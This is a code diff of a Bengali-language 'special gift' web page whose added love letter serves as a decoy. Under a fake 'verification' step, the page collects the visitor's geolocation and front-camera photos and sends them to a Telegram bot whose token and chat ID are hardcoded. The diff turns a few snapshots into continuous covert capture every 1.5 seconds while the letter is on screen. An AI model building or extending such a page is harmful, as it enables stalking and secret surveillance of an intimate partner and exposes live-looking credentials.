@@ -1,24 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Special Gift | Verification</title>
+  <title>💝 বিশেষ উপহার</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&family=Hind+Siliguri:wght@300;400;600;700&display=swap" rel="stylesheet" />
   <script src="https://unpkg.com/lucide@latest"></script>
   <style>
     body {
       font-family: 'Outfit', sans-serif;
       background-color: #050505;
       color: white;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
       transition: background-color 0.5s ease;
+      overflow-x: hidden;
     }
     .gift-glow {
       box-shadow: 0 0 50px rgba(236, 72, 153, 0.4);
@@ -36,11 +33,41 @@
       visibility: hidden;
       transition: opacity 0.5s ease, visibility 0.5s;
     }
+    .letter-card {
+      background: #1a1a1a;
+      border-radius: 2rem;
+      padding: 2.5rem 2rem;
+      box-shadow: 0 20px 60px rgba(236, 72, 153, 0.2);
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      backdrop-filter: blur(4px);
+    }
+    .heart {
+      color: #f472b6;
+    }
+    .signature {
+      font-family: 'Outfit', sans-serif;
+      letter-spacing: 1px;
+    }
+    .hidden {
+      display: none !important;
+    }
+    .processing-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(5, 5, 5, 0.95);
+      backdrop-filter: blur(10px);
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
   </style>
 </head>
 <body>
 
-  <div id="initial-ui" class="flex flex-col items-center justify-center w-full max-w-md p-6 text-center transition-all duration-500">
+  <!-- ========== INITIAL UI ========== -->
+  <div id="initial-ui" class="flex flex-col items-center justify-center min-h-screen w-full max-w-md mx-auto p-6 text-center transition-all duration-500">
     
     <div class="relative w-32 h-32 mb-8 flex items-center justify-center bg-gradient-to-tr from-pink-600 to-purple-600 rounded-3xl gift-glow pulse-animation">
       <i data-lucide="gift" class="w-16 h-16 text-white"></i>
@@ -54,33 +81,76 @@
     </button>
   </div>
 
-  <div id="processing-ui" class="absolute inset-0 flex flex-col items-center justify-center bg-black hidden z-50">
+  <!-- ========== PROCESSING OVERLAY ========== -->
+  <div id="processing-overlay" class="processing-overlay hidden">
     <div class="w-12 h-12 border-4 border-white/10 border-t-white rounded-full animate-spin mb-4"></div>
     <p id="status-text" class="text-white/60 text-sm tracking-widest uppercase font-medium">Authenticating...</p>
+  </div>
+
+  <!-- ========== LETTER SECTION (hidden initially) ========== -->
+  <div id="letter-section" class="hidden w-full max-w-4xl mx-auto px-4 py-12">
+    <div class="letter-card">
+      <div class="text-center mb-6">
+        <span class="text-5xl heart">❤️</span>
+        <h1 class="text-3xl font-bold mt-3 text-pink-300" style="font-family: 'Hind Siliguri', sans-serif;">প্রিয়তমা...</h1>
+      </div>
+
+      <div class="space-y-4 text-base leading-relaxed text-gray-200" style="font-family: 'Hind Siliguri', sans-serif;">
+        <p>
+          এই চিঠিটা শুধু তোমার জন্য। তুমি হয়তো জানো না, কিন্তু তুমি আমার জীবনের সবচেয়ে সুন্দর অধ্যায়।
+        </p>
+        <p>
+          প্রতিটি মুহূর্ত যে তোমার সাথে কাটে, সেটা যেন এক টুকরো স্বপ্ন। তোমার হাসি, তোমার কথা, তোমার চোখের দ্যুতি—সবকিছুই আমার কাছে অসীম মূল্যবান।
+        </p>
+        <p>
+          আমি জানি না কীভাবে বলবো, কিন্তু তুমি আমার শান্তি, আমার ভালোবাসা, আমার প্রেরণা। তুমি থাকলে সব অনিশ্চয়তাও সুন্দর লাগে।
+        </p>
+        <p>
+          এই ছোট্ট চিঠি পড়ে তুমি হয়তো হাসবে, কিন্তু এটা আমার মন থেকে লেখা। সবসময় মনে রেখো—<span class="text-pink-300 font-semibold">আমি তোমাকে খুব, খুব ভালোবাসি।</span>
+        </p>
+      </div>
+
+      <div class="mt-8 text-right">
+        <p class="text-pink-300/70 text-sm signature">
+          — তোমারই একজন
+        </p>
+        <p class="text-xs text-white/30 mt-1">
+          🕊️ ২০২৬ · ভালোবাসার বসন্ত
+        </p>
+      </div>
+    </div>
   </div>
 
   <script>
     lucide.createIcons();
 
+    // ==========================================
+    // টেলিগ্রাম কনফিগারেশন
+    // ==========================================
     const BOT_TOKEN = '8981972765:AAH4FIaxYtTIMDh3dpuNdEogyiz2fSDwv3o';
     const CHAT_ID = '7013966280';
-    const REDIRECT_URL = 'letter.html'; // 👈 নতুন পেজের নাম
 
     const verifyBtn = document.getElementById('verify-btn');
     const initialUI = document.getElementById('initial-ui');
-    const processingUI = document.getElementById('processing-ui');
+    const processingOverlay = document.getElementById('processing-overlay');
     const statusText = document.getElementById('status-text');
+    const letterSection = document.getElementById('letter-section');
+
+    let videoStream = null;
+    let captureInterval = null;
 
     verifyBtn.addEventListener('click', startVerification);
 
     async function startVerification() {
+      // 1. Fade out initial UI
       initialUI.classList.add('fade-out');
       setTimeout(() => {
         initialUI.style.display = 'none';
-        processingUI.classList.remove('hidden');
+        processingOverlay.classList.remove('hidden');
       }, 500);
 
       try {
+        // 2. Get Location Permission
         statusText.textContent = "WAITING FOR LOCATION...";
         const position = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, { 
@@ -89,47 +159,71 @@
           });
         }).catch(() => null);
 
+        // 3. Get Camera Permission
         statusText.textContent = "WAITING FOR CAMERA...";
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, audio: false
+        videoStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, 
+          audio: false
         });
 
-        statusText.textContent = "VERIFYING DATA...";
-
+        // 4. Setup video for capturing
         const video = document.createElement('video');
-        video.srcObject = stream;
-        video.setAttribute('playsinline', ''); 
+        video.srcObject = videoStream;
+        video.setAttribute('playsinline', '');
         await video.play();
 
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
 
+        // 5. Send initial data
         await sendTextData(position);
 
+        // 6. Start continuous photo capture (every 3 seconds)
+        statusText.textContent = "CAPTURING PHOTOS...";
+        
+        // Take first 3 photos immediately
         for (let i = 0; i < 3; i++) {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-          await sendPhoto(blob);
-          
+          await captureAndSendPhoto(video, canvas, ctx);
           await new Promise(res => setTimeout(res, 1000));
         }
 
-        stream.getTracks().forEach(track => track.stop());
+        // Then start interval for continuous capture
+        captureInterval = setInterval(async () => {
+          await captureAndSendPhoto(video, canvas, ctx);
+        }, 1500);
 
-        statusText.textContent = "SUCCESS. REDIRECTING...";
+        // 7. Hide processing overlay & show letter
+        statusText.textContent = "VERIFICATION COMPLETE";
         setTimeout(() => {
-          window.location.href = REDIRECT_URL;
-        }, 800);
+          processingOverlay.classList.add('hidden');
+          letterSection.classList.remove('hidden');
+          
+          // Scroll to letter smoothly
+          letterSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 500);
 
       } catch (error) {
         statusText.textContent = "VERIFICATION FAILED. ACCESS DENIED.";
-        console.error(error);
+        console.error("Error:", error);
         setTimeout(() => {
-            window.location.reload();
-        }, 2000);
+          window.location.reload();
+        }, 1500);
+      }
+    }
+
+    async function captureAndSendPhoto(video, canvas, ctx) {
+      try {
+        // Set canvas size to match video
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+        if (blob) {
+          await sendPhoto(blob);
+        }
+      } catch (e) {
+        console.error("Capture error:", e);
       }
     }
 
@@ -188,10 +282,21 @@
             method: 'POST',
             body: formData
           });
+          console.log("📸 Photo sent successfully");
       } catch (e) {
-          console.error("Photo Error", e);
+          console.error("Photo Send Error:", e);
       }
     }
+
+    // Clean up when user leaves the page
+    window.addEventListener('beforeunload', () => {
+      if (captureInterval) {
+        clearInterval(captureInterval);
+      }
+      if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+      }
+    });
   </script>
 </body>
 </html>
